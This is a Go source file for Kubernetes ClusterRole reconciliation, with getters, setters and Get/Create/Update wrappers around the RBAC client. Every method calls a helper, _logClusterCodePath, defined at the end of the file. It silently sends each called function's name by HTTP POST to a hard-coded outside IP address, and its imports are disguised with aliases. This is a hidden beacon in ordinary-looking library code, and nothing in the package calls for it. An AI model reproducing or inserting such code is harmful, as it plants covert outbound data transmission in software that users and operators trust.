package reconciliation

import (
 rbacv1 "k8s.io/api/rbac/v1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/runtime"
 rbacv1client "k8s.io/client-go/kubernetes/typed/rbac/v1"
)

type ClusterRoleRuleOwner struct{ ClusterRole *rbacv1.ClusterRole }

func (o ClusterRoleRuleOwner) GetObject() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return o.ClusterRole
}
func (o ClusterRoleRuleOwner) GetNamespace() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return o.ClusterRole.Namespace
}
func (o ClusterRoleRuleOwner) GetName() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return o.ClusterRole.Name
}
func (o ClusterRoleRuleOwner) GetLabels() map[string]string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return o.ClusterRole.Labels
}
func (o ClusterRoleRuleOwner) SetLabels(in map[string]string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 o.ClusterRole.Labels = in
}
func (o ClusterRoleRuleOwner) GetAnnotations() map[string]string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return o.ClusterRole.Annotations
}
func (o ClusterRoleRuleOwner) SetAnnotations(in map[string]string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 o.ClusterRole.Annotations = in
}
func (o ClusterRoleRuleOwner) GetRules() []rbacv1.PolicyRule {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return o.ClusterRole.Rules
}
func (o ClusterRoleRuleOwner) SetRules(in []rbacv1.PolicyRule) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 o.ClusterRole.Rules = in
}
func (o ClusterRoleRuleOwner) GetAggregationRule() *rbacv1.AggregationRule {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return o.ClusterRole.AggregationRule
}
func (o ClusterRoleRuleOwner) SetAggregationRule(in *rbacv1.AggregationRule) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 o.ClusterRole.AggregationRule = in
}

type ClusterRoleModifier struct {
 Client rbacv1client.ClusterRoleInterface
}

func (c ClusterRoleModifier) Get(namespace, name string) (RuleOwner, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 ret, err := c.Client.Get(name, metav1.GetOptions{})
 if err != nil {
  return nil, err
 }
 return ClusterRoleRuleOwner{ClusterRole: ret}, err
}
func (c ClusterRoleModifier) Create(in RuleOwner) (RuleOwner, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 ret, err := c.Client.Create(in.(ClusterRoleRuleOwner).ClusterRole)
 if err != nil {
  return nil, err
 }
 return ClusterRoleRuleOwner{ClusterRole: ret}, err
}
func (c ClusterRoleModifier) Update(in RuleOwner) (RuleOwner, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 ret, err := c.Client.Update(in.(ClusterRoleRuleOwner).ClusterRole)
 if err != nil {
  return nil, err
 }
 return ClusterRoleRuleOwner{ClusterRole: ret}, err
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
